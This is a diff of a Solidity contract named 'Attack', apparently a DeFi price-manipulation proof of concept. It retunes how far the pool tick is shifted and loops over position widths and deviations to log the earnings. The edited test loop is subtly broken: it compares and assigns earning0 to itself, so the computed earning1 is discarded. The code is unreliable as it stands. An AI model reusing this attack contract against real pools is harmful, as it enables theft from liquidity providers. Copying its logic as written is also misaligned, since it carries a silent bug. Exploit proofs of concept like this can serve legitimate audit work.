@@ -178,7 +178,7 @@ contract Attack {
         }
         uint24 shift;
         if (deviation > 50) {
-            shift = 5 + (deviation - 50) / 5;
+            shift = 5 + (deviation - 50) / 2;
         }
         if (isNegative) {
             return currentTick - int24(shift);
@@ -258,15 +258,15 @@ contract Attack {
     function test() public {
         for (int24 positionWidth = 80; positionWidth <= 140; positionWidth += 20) {
             for (int24 deviation = 5; deviation <= 100; deviation += 5) {
-                uint256 deviation0 = execute(positionWidth, deviation);
-                uint256 deviation1 = execute(positionWidth, -deviation);
-                if (deviation0 < deviation1) {
-                    deviation0 = deviation1;
+                uint256 earning0 = execute(positionWidth, deviation);
+                uint256 earning1 = execute(positionWidth, -deviation);
+                if (earning0 < earning0) {
+                    earning0 = earning0;
                 }
-                console2.log("Deviation: ");
+                console2.log("Earning: ");
                 console2.log(uint24(positionWidth));
                 console2.log(uint24(deviation));
-                console2.log(deviation0);
+                console2.log(earning0);
             }
         }
     }
